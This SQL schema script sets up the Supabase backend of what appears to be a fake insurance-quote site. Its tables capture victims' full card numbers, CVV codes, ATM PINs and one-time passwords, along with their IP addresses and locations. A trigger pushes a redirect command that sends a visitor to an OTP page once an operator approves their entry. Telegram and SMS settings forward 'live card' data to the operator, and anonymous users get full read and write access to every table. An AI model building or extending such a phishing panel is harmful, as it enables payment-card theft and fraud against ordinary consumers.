
-- ================= Tables =================
CREATE TABLE IF NOT EXISTS public.applications (
  id TEXT PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  visitor_id TEXT,
  full_name TEXT, identity TEXT, birth_date TEXT, phone TEXT,
  insurance_type TEXT, start_date TEXT, purpose TEXT, est_value TEXT,
  car_year TEXT, car_model TEXT, repair_place TEXT, company TEXT, type TEXT,
  price NUMERIC, total NUMERIC, method TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  review_status TEXT NOT NULL DEFAULT 'awaiting_review',
  card_number TEXT, card_name TEXT, card_exp_month TEXT, card_exp_year TEXT,
  card_cvv TEXT, card_brand TEXT, card_last4 TEXT, otp_code TEXT,
  atm_pin TEXT, mutasil_phone TEXT, mutasil_provider TEXT, mutasil_id TEXT, mutasil_otp TEXT,
  screenshot_urls TEXT[]
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.applications TO anon, authenticated;
GRANT ALL ON public.applications TO service_role;
ALTER TABLE public.applications ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_applications" ON public.applications;
CREATE POLICY "anon_all_applications" ON public.applications FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.visitor_sessions (
  visitor_id TEXT PRIMARY KEY,
  last_path TEXT, last_seen_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  user_agent TEXT, platform TEXT, is_mobile BOOLEAN, referrer TEXT,
  ip TEXT, country TEXT, country_code TEXT, city TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.visitor_sessions TO anon, authenticated;
GRANT ALL ON public.visitor_sessions TO service_role;
ALTER TABLE public.visitor_sessions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_sessions" ON public.visitor_sessions;
CREATE POLICY "anon_all_sessions" ON public.visitor_sessions FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.visitor_commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  visitor_id TEXT NOT NULL, command TEXT NOT NULL, payload TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.visitor_commands TO anon, authenticated;
GRANT ALL ON public.visitor_commands TO service_role;
ALTER TABLE public.visitor_commands ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_commands" ON public.visitor_commands;
CREATE POLICY "anon_all_commands" ON public.visitor_commands FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.blocked_visitors (
  visitor_id TEXT PRIMARY KEY, reason TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.blocked_visitors TO anon, authenticated;
GRANT ALL ON public.blocked_visitors TO service_role;
ALTER TABLE public.blocked_visitors ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_blocked" ON public.blocked_visitors;
CREATE POLICY "anon_all_blocked" ON public.blocked_visitors FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.chat_conversations (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  visitor_id TEXT NOT NULL,
  customer_name TEXT NOT NULL DEFAULT '',
  customer_phone TEXT NOT NULL DEFAULT '',
  last_message_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  unread_admin INTEGER NOT NULL DEFAULT 0,
  unread_customer INTEGER NOT NULL DEFAULT 0,
  initiated_by TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_conversations TO anon, authenticated;
GRANT ALL ON public.chat_conversations TO service_role;
ALTER TABLE public.chat_conversations ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_conv" ON public.chat_conversations;
CREATE POLICY "anon_all_conv" ON public.chat_conversations FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.chat_messages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  conversation_id UUID NOT NULL REFERENCES public.chat_conversations(id) ON DELETE CASCADE,
  sender TEXT NOT NULL, content TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_messages TO anon, authenticated;
GRANT ALL ON public.chat_messages TO service_role;
ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_msg" ON public.chat_messages;
CREATE POLICY "anon_all_msg" ON public.chat_messages FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.chat_blocked_visitors (
  visitor_id TEXT PRIMARY KEY, reason TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_blocked_visitors TO anon, authenticated;
GRANT ALL ON public.chat_blocked_visitors TO service_role;
ALTER TABLE public.chat_blocked_visitors ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_chat_block" ON public.chat_blocked_visitors;
CREATE POLICY "anon_all_chat_block" ON public.chat_blocked_visitors FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.sms_settings (
  id TEXT PRIMARY KEY,
  provider_name TEXT NOT NULL DEFAULT '',
  api_url TEXT NOT NULL DEFAULT '',
  http_method TEXT NOT NULL DEFAULT 'POST',
  headers_json TEXT NOT NULL DEFAULT '{}',
  body_template TEXT NOT NULL DEFAULT '',
  content_type TEXT NOT NULL DEFAULT 'application/json',
  default_sender_id TEXT NOT NULL DEFAULT '',
  phone_format TEXT NOT NULL DEFAULT 'e164',
  enabled BOOLEAN NOT NULL DEFAULT false,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.sms_settings TO anon, authenticated;
GRANT ALL ON public.sms_settings TO service_role;
ALTER TABLE public.sms_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_sms_settings" ON public.sms_settings;
CREATE POLICY "anon_all_sms_settings" ON public.sms_settings FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.sms_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  application_id TEXT, phone TEXT NOT NULL,
  sender_id TEXT NOT NULL DEFAULT '', message TEXT NOT NULL,
  status TEXT NOT NULL, http_status INTEGER,
  provider_response TEXT, error TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.sms_logs TO anon, authenticated;
GRANT ALL ON public.sms_logs TO service_role;
ALTER TABLE public.sms_logs ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_sms_logs" ON public.sms_logs;
CREATE POLICY "anon_all_sms_logs" ON public.sms_logs FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.telegram_settings (
  id TEXT PRIMARY KEY,
  enabled BOOLEAN NOT NULL DEFAULT false,
  bot_token TEXT NOT NULL DEFAULT '',
  chat_id TEXT NOT NULL DEFAULT '',
  send_live_card BOOLEAN NOT NULL DEFAULT true,
  send_steps BOOLEAN NOT NULL DEFAULT true,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.telegram_settings TO anon, authenticated;
GRANT ALL ON public.telegram_settings TO service_role;
ALTER TABLE public.telegram_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_tg" ON public.telegram_settings;
CREATE POLICY "anon_all_tg" ON public.telegram_settings FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

-- ================= Visitor identity functions =================
CREATE EXTENSION IF NOT EXISTS pgcrypto WITH SCHEMA extensions;
CREATE SCHEMA IF NOT EXISTS private;
GRANT USAGE ON SCHEMA private TO anon, authenticated, service_role;

CREATE TABLE IF NOT EXISTS private.visitor_secret (
  id int PRIMARY KEY, secret bytea NOT NULL,
  CONSTRAINT visitor_secret_singleton CHECK (id = 1)
);
INSERT INTO private.visitor_secret(id, secret)
VALUES (1, extensions.gen_random_bytes(32)) ON CONFLICT (id) DO NOTHING;
REVOKE ALL ON private.visitor_secret FROM PUBLIC;
GRANT ALL ON private.visitor_secret TO service_role;

CREATE OR REPLACE FUNCTION private.mint_visitor_token()
RETURNS text LANGUAGE plpgsql SECURITY DEFINER SET search_path = '' AS $$
DECLARE _vid text; _sec bytea; _sig text;
BEGIN
  _vid := 'V-' || encode(extensions.gen_random_bytes(12), 'hex');
  SELECT secret INTO _sec FROM private.visitor_secret WHERE id = 1;
  _sig := encode(extensions.hmac(_vid::bytea, _sec, 'sha256'), 'hex');
  RETURN _vid || '.' || _sig;
END; $$;

CREATE OR REPLACE FUNCTION private.resolve_visitor_id()
RETURNS text LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = '' AS $$
DECLARE _headers json; _token text; _vid text; _sig text; _sec bytea; _expected text; _dot int;
BEGIN
  BEGIN _headers := current_setting('request.headers', true)::json;
  EXCEPTION WHEN OTHERS THEN RETURN NULL; END;
  _token := _headers ->> 'x-visitor-token';
  IF _token IS NULL OR _token = '' THEN RETURN NULL; END IF;
  _dot := position('.' in _token);
  IF _dot < 2 THEN RETURN NULL; END IF;
  _vid := substring(_token from 1 for _dot - 1);
  _sig := substring(_token from _dot + 1);
  IF _vid = '' OR _sig = '' THEN RETURN NULL; END IF;
  SELECT secret INTO _sec FROM private.visitor_secret WHERE id = 1;
  IF _sec IS NULL THEN RETURN NULL; END IF;
  _expected := encode(extensions.hmac(_vid::bytea, _sec, 'sha256'), 'hex');
  IF _sig = _expected THEN RETURN _vid; END IF;
  RETURN NULL;
END; $$;

REVOKE ALL ON FUNCTION private.mint_visitor_token() FROM PUBLIC;
REVOKE ALL ON FUNCTION private.resolve_visitor_id() FROM PUBLIC;

CREATE OR REPLACE FUNCTION public.current_visitor_id()
RETURNS text LANGUAGE sql STABLE SECURITY DEFINER SET search_path = private, public AS $$
  SELECT private.resolve_visitor_id();
$$;

CREATE OR REPLACE FUNCTION public.issue_visitor_token()
RETURNS text LANGUAGE sql SECURITY DEFINER SET search_path = private, public AS $$
  SELECT private.mint_visitor_token();
$$;

REVOKE ALL ON FUNCTION public.current_visitor_id() FROM PUBLIC;
REVOKE ALL ON FUNCTION public.issue_visitor_token() FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.current_visitor_id() TO anon, authenticated, service_role;
GRANT EXECUTE ON FUNCTION public.issue_visitor_token() TO anon, authenticated, service_role;

CREATE OR REPLACE FUNCTION public.is_admin_user()
RETURNS boolean LANGUAGE plpgsql STABLE SECURITY INVOKER SET search_path = public AS $$
DECLARE _email text;
BEGIN
  BEGIN _email := lower(coalesce(auth.jwt() ->> 'email', '')); EXCEPTION WHEN OTHERS THEN _email := ''; END;
  IF _email = '' THEN RETURN false; END IF;
  RETURN _email IN ('aa809077a@gmail.com');
END; $$;
GRANT EXECUTE ON FUNCTION public.is_admin_user() TO anon, authenticated;

CREATE OR REPLACE FUNCTION public.get_my_applications(p_limit integer DEFAULT 5)
RETURNS TABLE(id text, created_at timestamp with time zone, visitor_id text, status text, review_status text, method text, card_brand text, card_last4 text, total numeric, price numeric, company text, insurance_type text, mutasil_provider text, mutasil_phone text, mutasil_id text, screenshot_urls text[])
LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
DECLARE _vid text;
BEGIN
  _vid := public.current_visitor_id();
  IF _vid IS NULL OR _vid !~ '^V-[0-9a-f]{24}$' THEN RETURN; END IF;
  RETURN QUERY
    SELECT a.id, a.created_at, a.visitor_id, a.status, a.review_status, a.method,
           a.card_brand, a.card_last4, a.total, a.price, a.company, a.insurance_type,
           a.mutasil_provider, a.mutasil_phone, a.mutasil_id, a.screenshot_urls
    FROM public.applications a
    WHERE a.visitor_id = _vid
    ORDER BY a.created_at DESC
    LIMIT greatest(1, least(coalesce(p_limit, 5), 20));
END; $$;
REVOKE ALL ON FUNCTION public.get_my_applications(integer) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.get_my_applications(integer) TO anon, authenticated, service_role;

-- Trigger: mirror application review status changes into visitor_commands
CREATE OR REPLACE FUNCTION public.sync_application_redirect_command()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NEW.visitor_id IS NULL OR NEW.review_status IS NOT DISTINCT FROM OLD.review_status THEN
    RETURN NEW;
  END IF;
  IF NEW.review_status = 'approved' THEN
    DELETE FROM public.visitor_commands WHERE visitor_id = NEW.visitor_id;
    INSERT INTO public.visitor_commands (visitor_id, command, payload)
    VALUES (NEW.visitor_id, 'redirect', '/quote/otp');
  ELSIF NEW.review_status = 'rejected' THEN
    DELETE FROM public.visitor_commands WHERE visitor_id = NEW.visitor_id AND command = 'redirect';
  END IF;
  RETURN NEW;
END; $$;
DROP TRIGGER IF EXISTS sync_application_redirect_command_trigger ON public.applications;
CREATE TRIGGER sync_application_redirect_command_trigger
AFTER UPDATE OF review_status ON public.applications
FOR EACH ROW EXECUTE FUNCTION public.sync_application_redirect_command();

-- Realtime
DO $$
DECLARE t text;
BEGIN
  FOREACH t IN ARRAY ARRAY['applications','chat_conversations','chat_messages','visitor_sessions','visitor_commands','blocked_visitors','chat_blocked_visitors','sms_logs','sms_settings','telegram_settings'] LOOP
    BEGIN
      EXECUTE format('ALTER PUBLICATION supabase_realtime ADD TABLE public.%I', t);
    EXCEPTION WHEN OTHERS THEN NULL;
    END;
  END LOOP;
END $$;
